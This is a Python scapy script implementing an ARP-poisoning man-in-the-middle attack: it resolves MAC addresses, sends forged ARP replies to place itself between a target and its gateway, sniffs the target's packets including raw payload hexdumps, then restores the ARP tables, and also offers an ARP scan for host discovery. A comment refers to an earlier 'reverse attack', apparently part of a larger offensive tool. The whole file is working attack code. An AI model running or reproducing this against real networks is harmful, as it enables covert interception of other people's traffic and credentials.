from scapy.all import *
import sys
import time

response = ""

def get_mac_address(ip_address):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
    answered, unanswered = srp(packet, timeout=2, verbose=0)

    for sent,received in answered:
        return received[ARP].hwsrc

def restore_arp_tables(gateway_ip, gateway_mac, target_ip, target_mac):
    # print("Restoring...")
    gateway_to_target = Ether()/ARP(op=2, hwsrc= gateway_mac, psrc= gateway_ip, pdst= target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    target_to_gateway = Ether()/ARP(op=2, hwsrc= target_mac, psrc= target_ip, pdst= gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(gateway_to_target, count=10, verbose= 0)
    send(target_to_gateway, count=10, verbose= 0)
    # print("Restoring done...")

def poison_arp_tables(gateway_ip, gateway_mac, target_ip, target_mac):

    # print("Poisoning.....")
    gateway_to_target = ARP(op=2, hwdst= target_mac, psrc= gateway_ip, pdst= target_ip)
    target_to_gateway = ARP(op=2, hwdst= gateway_mac, psrc= target_ip, pdst= gateway_ip)
    try:
        send(gateway_to_target, verbose=0)
        send(target_to_gateway, verbose=0)
    except Exception as e:
        sys.exit()
    # print("Poisoning done...")

def callback(packet):
    global response
    if(packet.haslayer('Ethernet')):
        response = response + "Ethernet src: " + str(packet['Ethernet'].src) + "\n"
        response = response + "Ethernet dst: " + str(packet['Ethernet'].dst) + "\n"
        response = response + "Ethernet type: " + str(packet['Ethernet'].type) + "\n"
    
    if(packet.haslayer('IP')):
        response = response + "IP ttl: " +str(packet['IP'].ttl) + "\n"
        response = response + "IP src: " +str(packet['IP'].src) + "\n"
        response = response + "IP dst: " + str(packet['IP'].dst) + "\n"

    if(packet.haslayer('TCP')):
        response = response + "TCP sport: " + str(packet['TCP'].sport) + "\n"
        response = response + "TCP dport: " +str(packet['TCP'].dport) + "\n"
        response = response + "TCP flags: " + str(packet['TCP'].flags) + "\n"
        
    if(packet.haslayer('Raw')):
        response = response + "Raw: " + str(hexdump(packet['Raw'].load)) + "\n"

    response = response + ("------------------------------\n")

def sniffer(target_ip):
    filter_string = "ip host " + target_ip
    sniff(count=5, prn=callback, filter= filter_string)


def discovery(dst, time):
    global response
    ethernet_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = ARP(pdst= dst)
    ans, unans = srp(ethernet_layer/arp_layer, timeout=int(time))

    for sent, received in ans:
        response = response + received[ARP].psrc + " "
    
    return response

def entry(target_ip, gateway_ip):
    
    # assuming we have performed the reverse attack, we know the following
    global response
    response = ""
    TARGET_IP = target_ip
    GATEWAY_IP = gateway_ip

    TARGET_MAC_ADDRESS = get_mac_address(TARGET_IP)

    GATEWAY_MAC_ADDRESS = get_mac_address(GATEWAY_IP)

    poison_arp_tables(GATEWAY_IP, GATEWAY_MAC_ADDRESS, TARGET_IP, TARGET_MAC_ADDRESS)

    sniffer(TARGET_IP)
        
    restore_arp_tables(GATEWAY_IP, GATEWAY_MAC_ADDRESS, TARGET_IP, TARGET_MAC_ADDRESS)

    return response

# output = entry("192.168.43.125", "192.168.43.70")
# print(output)
# print(len(output))

# output = discovery('192.168.43.1/24', 10)
# print(output)